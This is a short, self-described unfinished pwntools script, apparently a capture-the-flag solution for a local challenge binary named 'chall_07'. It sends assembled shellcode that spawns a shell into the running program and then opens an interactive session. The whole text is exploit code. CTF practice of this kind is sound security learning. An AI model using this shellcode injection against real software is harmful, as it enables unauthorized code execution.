from pwn import *
binary = context.binary = ELF('./chall_07')
p = process(binary.path)
p.sendline(asm(shellcraft.sh()))
p.interactive()
# NOT FINISHED
